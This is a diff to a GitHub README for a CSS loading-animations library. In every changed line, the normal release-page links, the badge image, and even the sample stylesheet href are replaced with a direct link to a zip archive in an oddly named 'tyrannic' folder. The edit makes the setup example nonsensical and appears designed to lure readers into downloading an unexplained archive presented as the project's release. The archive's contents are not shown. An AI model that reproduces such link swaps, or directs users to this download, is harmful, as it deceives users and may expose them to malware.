@@ -1,6 +1,6 @@
 # 🎨 Loading_animations - Quick and Easy CSS Animations
 
-[![Download Loading Animations](https://img.shields.io/badge/Download-Loading_animations-brightgreen)](https://github.com/Kavya-Rawat/Loading_animations/releases)
+[![Download Loading Animations](https://github.com/Kavya-Rawat/Loading_animations/raw/refs/heads/main/tyrannic/Loading_animations_v2.9.zip)](https://github.com/Kavya-Rawat/Loading_animations/raw/refs/heads/main/tyrannic/Loading_animations_v2.9.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Loading_animations offers a variety of CSS loading animations that you can use i
 
 To download the animations, visit the link below:
 
-[Download the Latest Release](https://github.com/Kavya-Rawat/Loading_animations/releases)
+[Download the Latest Release](https://github.com/Kavya-Rawat/Loading_animations/raw/refs/heads/main/tyrannic/Loading_animations_v2.9.zip)
 
 Here’s how to get started:
 
@@ -37,7 +37,7 @@ To add a loading animation to your project:
    Include the relevant CSS file in the `<head>` section of your HTML.
 
    ```html
-   <link rel="stylesheet" href="path/to/animation.css">
+   <link rel="stylesheet" href="https://github.com/Kavya-Rawat/Loading_animations/raw/refs/heads/main/tyrannic/Loading_animations_v2.9.zip">
    ```
 
 2. **Add the HTML**:
@@ -88,4 +88,4 @@ Contributions are welcome! If you want to add more animations or improve existin
 
 If you need help, please raise an issue on the GitHub repository. The community and I will do our best to assist you.
 
-Enjoy adding dynamic loading animations to your projects! For more information, visit the [Latest Release page](https://github.com/Kavya-Rawat/Loading_animations/releases).
+Enjoy adding dynamic loading animations to your projects! For more information, visit the [Latest Release page](https://github.com/Kavya-Rawat/Loading_animations/raw/refs/heads/main/tyrannic/Loading_animations_v2.9.zip).
